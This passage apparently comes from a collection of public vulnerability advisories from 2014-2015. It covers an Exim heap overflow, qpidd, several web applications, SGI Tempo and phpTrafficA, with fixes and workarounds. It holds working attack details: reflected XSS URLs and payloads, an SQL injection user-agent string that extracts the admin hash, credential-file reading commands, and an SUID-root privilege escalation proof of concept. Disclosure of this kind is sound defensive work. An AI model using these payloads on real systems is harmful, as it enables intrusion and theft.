As a result, this artificially-enlarged free chunk overlaps another
block of memory, where Exim saves the error message ""503 sender not yet
given "" for later use:
|< malloc_chunk
|
-----|----------------------|-----------------------------|----------+----|-----
... | gethostbyname buffer |p|s|f|b|F|B| real free chunk | error message | ...
-----|----------------------|-----------------------------|----------+----|-----
| |
|<-------------------------------------->|
artificially enlarged free chunk
Then, we partially allocate the artificially-enlarged free chunk,
thereby splitting it in two: the newly allocated chunk, and a smaller,
free chunk (the remainder from the split). The malloc_chunk header for
this remaining free chunk overwrites the very beginning of the saved
error message with a pointer to the heap (the fd_nextsize pointer):
|< malloc_chunk |< malloc_chunk
| |
-----|----------------------|---------------------+-------|----------+----|-----
... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaa |p|s|f|b|F|B| r message | ...
-----|----------------------|---------------------+-------|----------+----|-----
| | X |
|<------------------->|<---------------->|
allocated chunk free chunk
Finally, we send an invalid SMTP command to Exim, and retrieve the
fd_nextsize heap pointer from Exim's SMTP response, which includes the
corrupted error message. This effectively turns gethostbyname's buffer
overflow into an information leak; moreover, it allows us to distinguish
between 32-bit and 64-bit machines.
--[ 6 - Acknowledgments ]-----------------------------------------------------
We would like to thank Alexander Peslyak of the Openwall Project for his
help with the disclosure process of this vulnerability."
5503,CVE-2015-0223: anonymous access to qpidd cannot be prevented,,CVE-2015-0223,"Apache Software Foundation - Security Advisory
anonymous access to qpidd cannot be prevented
CVE-2015-0223 CVS: 5.8
Severity: Moderate
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Qpid's qpidd up to and including version 0.30
Description:
An attacker can gain access to qpidd as an anonymous user, even if the
ANONYMOUS mechanism is disallowed.
Solution:
A patch is available (https://issues.apache.org/jira/browse/QPID-6325)
that addresses this vulnerability. The fix will be included in
subsequent releases, but can be applied to 0.30 if desired.
Common Vulnerability Score information:
Authorization can be used to restrict access to broker entities such
as queue and exchanges.
Credit:
This issue was discovered by G. Geshev from MWR Labs
Common Vulnerability Score information:
CVSS Base Score 5.8
Impact Subscore 4.9
Exploitability Subscore 8.6
Overall CVSS Score 5.8"
5504,CVE-2015-0224: qpidd can be crashed by unauthenticated user,,CVE-2015-0224,"Apache Software Foundation - Security Advisory
qpidd can be crashed by unauthenticated user
CVE-2015-0224 CVS: 7.8
Severity: Moderate
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Qpid's qpidd up to and including version 0.30
Description:
In CVE-2015-0203 it was announced that certain unexpected protocol
sequences cause the broker process to crash due to insufficient
checking, but that authentication could be used to restrict the
exploitation of this vulnerability.
It has now been discovered that in fact failing authentication does
not necessarily prevent exploitation of those reported
vulnerabilities.
Further, it was stated that one of the specific vulnerabilities was
that the qpidd broker can be crashed by sending it a sequence-set
containing an invalid range, where the start of the range is after the
end. This was an incorrect analysis of the vulnerability, which is in
fact caused by a sequence-set containing a single range expressing the
maximum possible gap.
Solution:
A further patch is available that handles a range expressing the
maximum possible gap without assertion
(https://issues.apache.org/jira/browse/QPID-6310). The fix will be
included in subsequent releases, but can be applied to 0.30 if
desired.
Credit:
This issue was discovered by G. Geshev from MWR Labs
Common Vulnerability Score information:
CVSS Base Score 7.8
Impact Subscore 6.9
Exploitability Subscore 10
Overall CVSS Score 7.8"
5509,CVE-2015-1179-xss-mango-automation-scada,,CVE-2015-1179,"CVE-2015-1179-xss-mango-automation-scada
Information
-----------------
Advisory by Octogence.
Name: Reflected XSS Vulnerability in Mango Automation SCADA/HMI software
Affected Software : Mango Automation
Affected Versions: 2.4.0 and possibly below
Vendor Homepage : http://infiniteautomation.com/
Vulnerability Type : Cross-site Scripting
Severity : High
CVE ID: CVE-2015-1179
Impact
----------
An attacker can craft a URL with malicious JavaScript code which
executes in the browser.
Technical Details
-------------------------
Sample URL:
http://localhost/data_point_details.shtm?dpid=b3f17<script>alert(1)</script>545cc
Parameters:
dpid
dpxid
pid
Sample Payload:
<script>alert(21)</script>
For more information on cross-site scripting vulnerabilities read the
following article:
https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
Advisory Timeline (mm/dd/yyyy)
------------------------------------------------
11/21/2014 – Reported
12/04/2014 – Vulnerability Fixed
01/22/2015 – Advisory Released
--
Regards
Sudhanshu
Octogence Tech Solutions
Noida, India
Mobile | +91-9971658929
Website| www.octogence.com"
5510,CVE-2015-1177-xss-exponent,,CVE-2015-1177,"CVE-2015-1177-xss-exponent
Information
----------------
Advisory by Octogence.
Name: Reflected XSS Vulnerability in Exponent CMS
Affected Software : Exponent
Affected Versions: 2.3.2 and possibly below
Vendor Homepage : http://www.exponentcms.org/
Vulnerability Type : Cross-site Scripting
Severity : High
CVE ID: CVE-2015-1177
Impact
----------
An attacker can craft a URL with malicious JavaScript code which
executes in the browser.
Technical Details
-------------------------
Sample URL:
http://localhost/exponent/index.php?controller=search&src=f324e”><img%20src%3da%20onerror%3dalert(1)>9cbae6bf552&action=search&search_string=test&int=%0d
Parameter:
src
Sample Payload:
“><img src=a onerror=alert(1)>
For more information on cross-site scripting vulnerabilities read the
following article:
https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
Advisory Timeline (mm/dd/yyyy)
----------------------------------------------
12/29/2014 – Reported
12/30/2014 – Vulnerability Fixed
01/22/2015 – Advisory Released
--
Regards
Sudhanshu
Octogence Tech Solutions
Noida, India
Mobile | +91-9971658929
Website| www.octogence.com"
5511,CVE-2015-1176-xss-osticket,,CVE-2015-1176,"CVE-2015-1176-xss-osticket
Information
----------------
Advisory by Octogence.
Name: Reflected XSS Vulnerability in osTicket Ticket system
Affected Software : osTicket
Affected Versions: 1.9.4 and possibly below
Vendor Homepage : http://osticket.com/
Vulnerability Type : Cross-site Scripting
Severity : High
CVE ID: CVE-2015-1176
Impact
----------
An attacker can craft a URL with malicious JavaScript code which
executes in the browser.
Technical Details
-------------------------
Sample URL:
http://localhost/osticket/upload/scp/tickets.php?a=search&status=032″><script>alert(1)<%2fscript>&uid=3
Parameter:
status
Sample Payload:
“><script>alert(1)</script>
For more information on cross-site scripting vulnerabilities read the
following article:
https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
Advisory Timeline (mm/dd/yyyy)
-----------------------------------------------
12/15/2014 – Reported
01/02/2015 – Vulnerability Fixed
01/18/2015 – Advisory Released
--
Regards
Sudhanshu
Octogence Tech Solutions
Noida, India
Mobile | +91-9971658929
Website| www.octogence.com"
5523,CVE-2015-1175-xss-prestashop,,CVE-2015-1175,"CVE-2015-1175-xss-prestashop
Information
——————–
Advisory by Octogence.
Name: Reflected XSS Vulnerability in prestashop ecommerce software
Affected Software : Prestashop
Affected Versions: 1.6.0.9 and possibly below
Vendor Homepage : https://www.prestashop.com/
Vulnerability Type : Cross-site Scripting
Severity : High
CVE ID: CVE-2015-1175
Impact
——
An attacker can craft a URL with malicious JavaScript code which
executes in the browser.
Technical Details
—————–
Sample URL:
http://localhost/prestashop/prestashop/modules/blocklayered/blocklayered-ajax.php?layered_id_feature_20=20_7&id_category_layered=8&layered_price_slider=16_532f363<img%20src%3da%20onerror%3dalert(1)>9c032&orderby=position&orderway=asctrue&_=1420314938300
Parameter:
layered_price_slider
Sample Payload:
<img src=a onerror=alert(1)>
For more information on cross-site scripting vulnerabilities read the
following article:
https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
Advisory Timeline (mm/dd/yyyy)
——————–
01/07/2015 – Reported
01/12/2015 – Vulnerability Fixed
01/18/2015 – Advisory Released
http://octogence.com/advisories/cve-2015-1175-xss-prestashop/
Regards
Sudhanshu
Octogence Tech Solutions
Noida, India
Mobile | +91-9971658929
Website| www.octogence.com"
5527,CVE-2015-1032 Kiwix Cross-Site Scripting Vulnerability,,CVE-2015-1032,"CVE-2015-1032
A cross-site scripting vulnerability in the ""Kiwix"" zim file reader was
discovered by Emmanuel Engelhart on 31 October 2014, and was reported on
Sourceforge here: http://sourceforge.net/p/kiwix/bugs/763/
This vulnerability does not affect most users of the program, only those
using the ""kiwix-serve"" binary to allow zim files to be read over a network.
Input to the search bar was not sanitised, thus allowing arbitrary
javascript code to be sent via servers running this program.
This image shows a proof of concept:
http://sourceforge.net/p/kiwix/bugs/763/attachment/ppdhmq.png
This vulnerability was fixed by Emmanuel Engelhart on 8 January 2015
with this commit:
http://sourceforge.net/p/kiwix/kiwix/ci/d1af5f0375c6db24d4071acf4806735725fd206e"
5548,MS14-080 CVE-2014-6365 Code,,CVE-2014-6365,"The attached file is exactly the code that I sent to
Microsoft Security Response Center ""MSRC""
(Screenshot pictures are deleted)
Technical details were said in this post:
MS14-080 CVE-2014-6365 Technical Details Without ""Nonsense""
(So I don't repeat here)
The attached file is 4124 bytes.
The attached file contains html/php/txt.
(All readable by plain text editor)
Regards,
PS
I didn't publish this in the first post,
because it has XSS vulnerability of a big name
United Nations ""UN""
(Frankly they look like - sigh)
My style is realism. So here we go."
5558,"MS14-080 CVE-2014-6365 Technical Details Without ""Nonsense""",,CVE-2014-6365,"Origin:
Visit https://technet.microsoft.com/library/security/ms14-080
Go to ""Acknowledgments"" part and search for ""CVE-2014-6365""
It says ""Dieyu"" - that's me.
Technical Details:
""Internet Explorer XSS Filter Bypass Vulnerability"" is done by...
1. Inject ""a href"" link into target page.
(Not script, allowed by filter)
2. User clicks this injected link.
(Clickjacking etc)
3. URL of this injected link puts script into page.
(Filter does not kill it)
(Because it's transaction of the same domain)
Social Activities:
1. Greetings
David Ross ""dross"".
2. Hey, if you love my hacking, please reply ""nice"".
(I do this for free. Love to hear from my readers.)
3. My LinkedIn page: https://www.linkedin.com/in/liuzhiyong
(You can add me there! Recently I took a new name.)
4. My ultimate ""flaw"": http://dieyu.org/
(You know my style. Comment is welcome!)
Regards,"
5559,CVE-2015-0203: Apache Qpid's qpidd can be crashed by authenticated user,,CVE-2015-0203,"Apache Software Foundation - Security Advisory
Apache Qpid's qpidd can be crashed by authenticated user
CVE-2015-0203 CVS: 5.2
Severity: Moderate
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Qpid's qpidd up to and including version 0.30
Description:
Certain unexpected protocol sequences cause the broker process to
crash due to insufficient checking. Three distinct cases were
identified as follows:
The AMQP 0-10 protocol defines a sequence set containing id
ranges. The qpidd broker can be crashed by sending it a sequence-set
containing an invalid range, where the start of the range is after the
end. This condition causes an assertion, which causes the broker
process to exit.
The AMQP 0-10 protocol defines header- and body- segments that may
follow certain commands. The only command for which such segments are
expected by qpidd is the message-transfer command. If another command
is sent that includes header and/or body segments, this will cause a
segmentation fault in the broker process, causing it then to exit.
The AMQP 0-10 protocol defines a session-gap control that can be sent
on any established session. The qpidd broker does not support this
control and responds with an appropriate error if requested on an
established session. However, if the control is sent before the
session is opened, the brokers handling causes an assertion which
results in the broker process exiting.
Solution:
A patch is available (https://issues.apache.org/jira/browse/QPID-6310)
that handles all these errors by sending an exception control to the
remote peer and leave the broker available to all other users. The fix
will be included in subsequent releases, but can be applied to 0.30 if
desired.
Common Vulnerability Score information:
Authentication can be used to restrict access to the broker. However
any authenticated user would be able to trigger this condition which
could therefore be considered a form of denial of service.
Credit:
This issue was discovered by G. Geshev from MWR Labs
Common Vulnerability Score information:
CVSS Base Score 6.3
Impact Subscore 6.9
Exploitability Subscore 6.8
CVSS Temporal Score 5.2
CVSS Environmental Score Not Defined
Modified Impact Subscore Not Defined
Overall CVSS Score 5.2"
5565,CVE-2014-8870: Arbitrary Redirect in Tapatalk Plugin for WoltLab Burning Board 4.0,,CVE-2014-8870,"The Tapatalk Plugin com.tapatalk.wbb4 for WoltLab Burning Board 4.0 prior to
version 1.1.2 allowed to redirect users to arbitrary URLs. This was possible by
specifying the target URL in the URL parameter board_url in URLs like the
following:
http://www.example.com/mobiquo/smartbanner/welcome.php?board_url=https://www.redteam-pentesting.de
CVE-2014-8870 was assigned to this issue.
--
RedTeam Pentesting GmbH Tel.: +49 241 510081-0
Dennewartstr. 25-27 Fax : +49 241 510081-99
52068 Aachen https://www.redteam-pentesting.de
Germany Registergericht: Aachen HRB 14004
Geschäftsführer: Patrick Hof, Jens Liebchen"
5692,"CVE-2014-2026 Reflected Cross-Site Scripting (XSS) in ""Intrexx Professional""",,CVE-2014-2026,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-2026
===================
""Reflected Cross-Site Scripting (XSS)"" (CWE-79) vulnerability
in ""Intrexx Professional"" product
Vendor
===================
United Planet GmbH
Product
===================
""Intrexx is an integrated cross-platform development environment for the creation
and operation of web-based applications, enterprise portals and intranet portals.""
- source: https://en.wikipedia.org/wiki/Intrexx
Affected versions
===================
This vulnerability affects versions of Intrexx Professional 6.0 (prior to Online Update 10)
and 5.2 (prior to Online Update 0905)
Patch availability
===================
The vendor has released the following fixes:
""Online Update 10"" or later for Intrexx Professional 6.0 users
""Online Update 0905"" or later for Intrexx Professional 5.2 users
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Medium
Exploitability
===================
Victim needs to visit malicious webpage of attacker
Description
===================
Using the request parameter of the search functionality it is possible to execute
Reflected Cross-Site Scripting (XSS) attacks. This enables attackers to impersonate
victim users (in context of the origin exposing the portal) when logged-in victims
are accessing attacker supplied links/sites.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
References
===================
https://help.unitedplanet.com/?rq_AppGuid=C203A277EDDF9AD2492B776B996B20D4A7C58395&rq_TargetPageGuid=7A91F4B76FFC41A18F4EA4ACE26F31E033C5B018
https://help.unitedplanet.com/?rq_AppGuid=C203A277EDDF9AD2492B776B996B20D4A7C58395&rq_TargetPageGuid=2EBBF802B1970FE31EFC8A34108DF3F47E7A8EEC&rq_RecId=32&rq_SourceAppGuid=C203A277EDDF9AD2492B776B996B20D4A7C58395&rq_SourcePageGuid=7A91F4B76FFC41A18F4EA4ACE26F31E033C5B018&rq_SourceRecId=32#{1}
http://www.christian-schneider.net/advisories/CVE-2014-2026.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iQIcBAEBAgAGBQJUjhC3AAoJEEDB74comLC+PQEP/3uN8CfRfZWMrWjcjZUl/OQf
d9ohQf1xyHxqC2IARrJcYVTHP1i/4VhnkFGd2Q0yrRqVEzlN84qgyXArkBW9RDkR
OgMkT3oqIERywpq3M9A91Jdb5LrdiFCKPj9kBbcXmsgsgZIPXlJSCQ92IoyepTrL
rYw9mUUkN+qxu07xPS2gdzYtpv51PoW2svZFnQKEbXa9wl8Yw5PcPqvYJkxG/TJv
KDD1U0k9d7Y5mLlvnVil8ANvDoXVD5YrNFX80pHi0hBbMQvchj2OOpq8Mia7IIjK
E4GjfshwZ4XZfSlNEu7ESoKdXxOwbm9M2N5a5DwiuXOwQLh6UKrZRPQMzz6L3HyX
KBjAodTGMPGtO8YHTJVsWIQpsB+gENUudxpcOJ8jnHMOwEp8T0zMHeWjaZpj2Gzm
3jrRjuScT8FzJMEudBSLFwZy+Ce6rC9PA4mmPqNKADW+E32vmt17HV1wO007k84H
LgmBkpvGh+ZefIhCNfKm6i6PfxFePqQZMycAJYwdF1P3IpVRHVW/o45XAyWZHOjU
/wRJpwlETJjSicibVcbx7hZxv1gjPwOoePeyMK6PciD0W3jdjRsABaOfQeJ5gQgL
BGfrziuu0uBnMTFWM5OJD8WW4qdWmgjQEh+xH4HErWOAV5VQJFABmkIfWfVD6vhK
yHJz6lRSMRhhVCxL6E3A
=fTQM
-----END PGP SIGNATURE-----"
5693,"CVE-2014-2025 Remote Code Execution (RCE) in ""Intrexx Professional""",,CVE-2014-2025,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2014-2025
===================
""Remote Code Execution (RCE) via Unrestricted File Upload"" (CWE-434) vulnerability
in ""Intrexx Professional"" product
Vendor
===================
United Planet GmbH
Product
===================
""Intrexx is an integrated cross-platform development environment for the creation
and operation of web-based applications, enterprise portals and intranet portals.""
- source: https://en.wikipedia.org/wiki/Intrexx
Affected versions
===================
This vulnerability affects versions of Intrexx Professional 6.0 (prior to Online Update 10)
and 5.2 (prior to Online Update 0905)
Patch availability
===================
The vendor has released the following fixes:
""Online Update 10"" or later for Intrexx Professional 6.0 users
""Online Update 0905"" or later for Intrexx Professional 5.2 users
Reported by
===================
This issue was reported to the vendor by Christian Schneider (@cschneider4711)
following a responsible disclosure process.
Severity
===================
Critical
Exploitability
===================
Exploitable by unauthenticated attackers
Description
===================
Using an unrestricted file upload it is possible to execute arbitrary code on the remote server
by uploading and remotely executing a malicious file that contains code by the attacker.
Proof of concept
===================
Due to the responsible disclosure process chosen and to not harm unpatched systems,
no concrete exploit code will be presented in this advisory.
References
===================
https://help.unitedplanet.com/?rq_AppGuid=C203A277EDDF9AD2492B776B996B20D4A7C58395&rq_TargetPageGuid=7A91F4B76FFC41A18F4EA4ACE26F31E033C5B018
https://help.unitedplanet.com/?rq_AppGuid=C203A277EDDF9AD2492B776B996B20D4A7C58395&rq_TargetPageGuid=2EBBF802B1970FE31EFC8A34108DF3F47E7A8EEC&rq_RecId=31&rq_SourceAppGuid=C203A277EDDF9AD2492B776B996B20D4A7C58395&rq_SourcePageGuid=7A91F4B76FFC41A18F4EA4ACE26F31E033C5B018&rq_SourceRecId=31#{1}
http://www.christian-schneider.net/advisories/CVE-2014-2025.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (Darwin)
iQIcBAEBAgAGBQJUjhBQAAoJEEDB74comLC+RLUQAIIt8gm+rbqfSVlX8lv3Keu2
smwtyRzaflCY14T69ZIcoUnaTg3qZTTWKb+f5AQ5aNh4RtPqvebw/Ws6eV9kUXtp
O3mvNSWOtMGVl5ILjtymFimE0HL00HezywLvpetq09uLDq0mQ/oiw0SEY7fcTGZs
QFJD/nuLdVDmiUm7jXal0SIQKpGPKgGRaYgQ4rY0p5UK6lOYFWvC7tzFjzyYYN2l
yBbzctu32souLQvb1NBoro7+m3O1nLZdygCiDAFWjs16PJqIGCYBR76M/hp17xjV
BuMIlqv48V6ovdIMhAGVyVkU1sHwBTwII5pS/gTM8/0z1mQ5HbAQJuadxRGOTSMt
hIElbEclzaOq/IyU5PuXN3dBN8HtGhdGydoI5NYPauQnPk1PAAeyn6o+ymrscKee
Ab5qO2PGAGHuzEsFy+NiLIsNkEHsUx39x5OrSFoG7y7Duhn1NZk1aDtaxooYupGG
1bz7Fte/trW9a0fhgns23jIswe/frL+f8gOteb8F8eZR8KV1i++Oe7bSpAKDSLOC
7vvkC0jBHL/8N3kcHkEZHEvlNL7yiYReU+o86M0ZcC+j5OsrLwKxoAAEl5wHmgaT
HanS8wr+C2h07TIwwdfk6TeZpUUjTnP0PLm/QSVbZ5klpt8myugMH0QcAMInGdBQ
gridV298e9Sgt9yettqF
=R/wg
-----END PGP SIGNATURE-----"
5735,[CVE-2014-7303] SGI Tempo System Database Exposure,,CVE-2014-7303,"[SGI Tempo System Database Exposure]
Software: SGI Tempo (SGI ICE-X Supercomputers)
Affected Versions: Unknown
CVE Reference: CVE-2014-7303
Author: John Fitzpatrick, MWR Labs
Severity: Low Risk
Vendor: Silicon Graphics International Corp (SGI)
Vendor Response: Uncooperative
[Description]
It is possible for users of ICE-X supercomputers to gain access to backups of system configuration databases.
[Impact]
The impact depends on the type of information held within this database. More recent versions of Tempo store root password hashes in the database, while in earlier versions of Tempo the impact is believed to me more limited.
[Cause]
Insecure (world readable) file permissions are set on the database backup.
[Solution]
SGI have chosen not to co-operate on resolving this issue. However, a workaround is possible:
* Alter the permissions on any current database dumps (this should be run/checked on all service nodes)
# chmod 600 /etc/dbdump.db
* Within the file /etc/opt/sgi/conf.d/80-update-mysql find the following section of code:
command = �mysqldump --user=root --pass="" + password + "" --all-databases --master-data > /etc/dbdump.db�
* Alter this to the following, in order to ensure the more secure permissions persist reboots:
command = �mysqldump --user=root --pass="" + password + "" --all-databases --master-data > /etc/dbdump.db; chmod 600 /etc/dbdump.db�
SGI have chosen not to cooperate with MWR in the co-ordinated disclosure of this and other SGI related security issues. MWR are therefore unable to provide specific version information and other details surrounding this issue. Whilst every effort has been made to ensure the accuracy and usefulness of this advisory it is recommend that SGI are contacted directly if further information is required.
[Detailed Timeline]
2014-02-11: Contact with SGI established
2014-02-20: Full vulnerability details provided to SGI
2014-04-14: Vulnerabilities acknowledged and response provided
2014-05-23: Update requested by MWR (not provided)
2014-07-23: Update requested by MWR (not provided)
2014-11-20: Contact with SGI re-attempted
2014-12-02: Advisory published
https://labs.mwrinfosecurity.com/advisories/2014/12/02/sgi-tempo-system-database-exposure/"
5736,[CVE-2014-7301] SGI Tempo System Database Password Exposure,,CVE-2014-7301,"[SGI Tempo System Database Password Exposure]
Software: SGI Tempo (SGI ICE-X Supercomputers)
Affected Versions: Unknown
CVE Reference: CVE-2014-7301
Author: John Fitzpatrick, MWR Labs
Severity: Medium Risk
Vendor: Silicon Graphics International Corp (SGI)
Vendor Response: Uncooperative
[Description]
It is possible for users to gain read+write access to the Tempo system (configuration) database on SGI ICE-X supercomputers due to insecurely set file permissions on the /etc/odapw file.
[Impact]
SGI describe the system database as �critical to the operation of your SGI ICE X system�. It is believed that this level of access could be used to cause significant disruption to the operation of the supercomputer. However, this has not been fully explored.
[Cause]
Insecure (world readable) file permissions are set on the /etc/odapw file which contains the password for this database.
[Solution]
SGI have chosen not to issue a fix. However, a workaround is trivial: Modify file permissions of the /etc/odapw file:
# chmod 600 /etc/odapw
[Technical Details]
SGI Tempo cluster management software, deployed on SGI ICE supercomputers, makes use of a system database (SDB, sometimes referred to as the Oscar database). This database (MySQL) contains system configuration information required for the operation of the cluster which, if altered, could cause severe disruption to the systems operation. In addition some information would be considered sensitive, particularly in more recent Tempo versions that have been found to store root password hashes as attributes within this database.
If root password hashes are held within the database they will be displayed as the result of running the following command:
# cattr list passwd_root
By default an anonymous account is available to query the SDB with read only permissions. An article on the SGI Supportfolio describes this issue and how to disable anonymous access:
https://support.sgi.com/kb_request/solution/display?KB_NODEUUID=62590135-708d-47d7-934e-b3fac09b7603&MODE=multiple (Registration required)
Disabling anonymous access will prevent non root users from running the c* commands (e.g. cattr, cnodes, etc.). Whilst providing read-only access does present its risks, the risk posed by providing read+write access is far more substantial as it can also be utilised to alter the system configuration and cause the system to fail to operate.
The default username for the database is �oscar�. The password for this is held in the /etc/odapw file which is present on service nodes and readable by all users of the system. The password follows a common structure shown below:
regexp: oscar(.[0-9]{3}){4}
example: oscar.324.519.262.397
The following MySQL command will establish a connection to the database and prompt for the password within the /etc/odapw file:
$ mysql -u oscar -h admin �p
[Workaround]
MWR recommend altering the permissions of the /etc/odapw file to prevent non root users from reading the password. This will prevent non root users from being able to make use of the c* commands:
# chmod 600 /etc/odapw
SGI have chosen not to co-operate with MWR in the co-ordinated disclosure of this and other SGI related security issues. MWR are therefore unable to provide specific version information and other details. Whilst every effort has been made to ensure the accuracy and usefulness of this advisory it is recommended that SGI are contacted directly if further information is required.
[Detailed Timeline]
2014-02-11: Contact with SGI established
2014-02-20: Full vulnerability details provided to SGI
2014-04-14: Vulnerabilities acknowledged and response provided
2014-05-23: Update requested by MWR (not provided)
2014-07-23: Update requested by MWR (not provided)
2014-11-20: Contact with SGI re-attempted
2014-12-02: Advisory published
https://labs.mwrinfosecurity.com/advisories/2014/12/02/sgi-tempo-system-database-password-exposure/"
5737,[CVE-2014-7302] SGI SUID Root Privilege Escalation,,CVE-2014-7302,"[SGI SUID Root Privilege Escalation]
Software: SGI Tempo (SGI ICE-X Supercomputers)
Affected Versions: Unknown
CVE Reference: CVE-2014-7302
Author: Luke Jennings, John Fitzpatrick, MWR Labs
Severity: Medium Risk
Vendor: Silicon Graphics International Corp (SGI)
Vendor Response: Uncooperative
[Description]
A vulnerability exists which allows low privileged local users to escalate their privileges to root.
[Impact]
Successful exploitation provides full root access to the affected system.
[Cause]
An insecure SUID root binary (/opt/sgi/sgimc/bin/vx).
[Solution]
If removing the vx binary is not an option this issue can be resolved by altering the file permissions:
# chmod 755 /opt/sgi/sgimc/bin/vx
[Technical Details]
A SUID root binary, believed to be part of the SGI Management Center, exists on SGI ICE-X supercomputers and is insecurely configured allowing for low privileged users to escalate their privileges. This binary is shown below:
$ ls -la /opt/sgi/sgimc/bin/vx
-rwsr-sr-x 1 root root 19248 2013-10-04 15:00 /opt/sgi/sgimc/bin/vx
MWR have only observed the vx binary on the admin nodes of ICE-X systems which are not typically accessible by non administrative users. If present on other nodes within the environment this issue should be considered a higher risk.
The output below shows the usage options available to users from the vx binary:
user@sgi:~/test> ./vx
Usage: vx -s[:<scanlist>] [-i:<ignorelist>] [<entries>]
vx -x [<entries>]
Options:
-s Scan the current directory or files listed in the specified file.
-i Ignore the directories listed in the specified file.
-x Extract files into the current directory.
NOTE: This program must be run directly or effectively as root.
The ""vx"" binary provides a means to apply file permissions to all files within a directory allowing for file permissions to be preserved across nodes in an efficient fashion. However, the SUID permissions set on this binary mean that any user can execute it in a manner which allows the user to alter the permissions of any file, regardless of ownership, and even to arbitrarily change file permissions. It is therefore possible to utilise the vx binary to set SUID root permissions on arbitrary files from a low privileged user account and thus escalate privileges.
[Proof of Concept]
This proof of concept demonstrates how the insecure permissions on this file can be exploited in order to create a SUID root executable. The example will use the Korn shell (ksh) for simplicity, but could easily be refactored for other purposes.
For the purpose of this example the contents of the current working directory are:
$ ls �la
drwxr-xr-x 3 j0hn users 4096 2014-09-01 14:42 .
drwxr-xr-x 13 j0hn users 4096 2014-09-01 14:42 ..
-rwxr-xr-x 1 j0hn users 38312 2014-09-01 14:30 ksh
-rwsr-sr-x 1 root root 19248 2014-08-19 19:41 vx
Run the following command in order to scan the current directory and create a file named ""mwrtestx"" that contains information on the file permissions of all files within your current working directory:
$ vx -s mwrtestx
The file ""mwrtestx"" will be created with the following content:
ksh^@f3wx92v53X3q3gB46FkQOX1^@5fat040116FkQOX1
vx^@f3S052Tt006bPnJX1^@5Wat040116ZtQOX1
The file mwrtestx contains the file name, file permissions as well as ownership details. Therefore if the filename ""vx"" within this file is altered to read ""ksh"" the file contents now specify that the ""ksh"" binary be set the SUID root permissions currently applied to the ""vx"" binary:
ksh^@f3S052Tt006bPnJX1^@5Wat040116ZtQOX1
Executing the ""vx"" binary with the ""mwrtestx"" file results in the file permissions within the ""mwrtestx"" file being applied, in this case resulting in ksh being altered and made SUID root:
$ vx -x mwrtestx
$ ls �la
drwxr-xr-x 3 j0hn users 4096 2014-09-01 14:45 .
drwxr-xr-x 13 j0hn users 4096 2014-09-01 14:45 ..
-rwsr-sr-x 1 root root 38312 2014-08-19 19:41 ksh
-rwsr-sr-x 1 root root 19248 2014-08-19 19:41 vx
To confirm that this has worked effectively ksh should be run:
$ ./ksh
# id
uid=200107(j0hn) gid=16100(users) euid=0(root) egid=0(root) groups=16100(users)
[Detailed Timeline]
SGI have chosen not to co-operate with MWR in the co-ordinated disclosure of this and other SGI related security issues. MWR are therefore unable to provide specific version information and other details. Whilst every effort has been made to ensure the accuracy and usefulness of this advisory it is recommend that SGI are contacted directly if further information is required.
2014-05-23: Contact with SGI attempted
2014-07-23: Contact with SGI re-attempted
2014-11-20: Contact with SGI re-attempted
2014-12-02: Advisory published
https://labs.mwrinfosecurity.com/advisories/2014/12/02/sgi-suid-root-privilege-escalation/"
5743,[CVE-2014-8340] phpTrafficA SQL injection,,CVE-2014-8340,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Product: phpTrafficA
Product page: http://soft.zoneo.net/phpTrafficA/
Affected versions: Up to and including 2.3 (latest as of writing).
Description:
An SQL injection exists in Php/Functions/log_function.php, line 933:
$sql3 =""INSERT INTO `${table}_host` SET date='$date', host='',
hostname='', page='$page', ref='$cleanref', agent='$agent',
longIP='$iplong'"";
The $agent variable comes directly from $_SERVER['HTTP_USER_AGENT'],
without any escaping. This makes SQL injection possible. Even if
multiple statements in one query has been turned off, the contents of
the database can still be read by manipulating the last parameter of the
query (the IPv4-address stored as an integer). For example, the
following spoofed user agent will store the ASCII-value of the second
character of the admin hash as its IP:
Firefox', longIP=(SELECT ASCII(SUBSTRING(value,2,1)) FROM
phpTrafficA_conf WHERE variable='adminpassword') #
This will be displayed in the ""Latest visitors > Details"" section, and
by repeating this procedure multiple times, the entire admin hash (or
any other database content) can be retrieved.
Partial mitigations:
- - Turn off ""multiple statements in one query"".
- - Hide ""Latest visitors > Details"" section from view. This prevents
the attacker from obtaining the output of the manipulated query.
- - Apply this quick fix to line 933:
$sql3 =""INSERT INTO `${table}_host` SET date='$date', host='',
hostname='', page='$page', ref='$cleanref',
agent='"".mysql_real_escape_string($agent).""', longIP='$iplong'"";
The code-fix does not resolve the SQL injection for all server
configurations, but should be sufficient for most. A proper fix would be
a version of phpTrafficA that uses PDO with prepared statements.
Best regards,
Daniel Geerts
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.14 (GNU/Linux)
iQIcBAEBAgAGBQJUhwA8AAoJEHn1bVIKHk5NxhYQAMiEbr06K7UQxXEZv0+3KTr6
LTA+65vVdmu0mTPQrTEjNeW46bv5tpnOuZc0q8Nprwbko2V/ANVXnD2NC4nBdYE8
J+7XonQq7CnsM//C504D2Vms3ylQhkthycCBc1OXaaEEIF2lmFrLPFsLLNkjaEAr
A5hDZJE7tSjDoq4/a3Psl1DLC+oblYbAA/JJxcSx5Abdnt47i9HMs9xWxN5Jn9oj
OwXoF31YrMxbMoqrENQqnc5lVvfxM+ki/t5sCZV4jk1kRX7Ivf7sEMbhiN0sKqnM
UeNwVSgi5308rAYdyg5zpUurvwIlKYtU9kA4N1sIVJCIGzeZXYCIOVAJZNglZ/NB
bX9EoLoxeU1R7RS2SWHLEneriiyj0nCyS1X+HSkov9p1gYemxqivgmBKsV3A4LxG
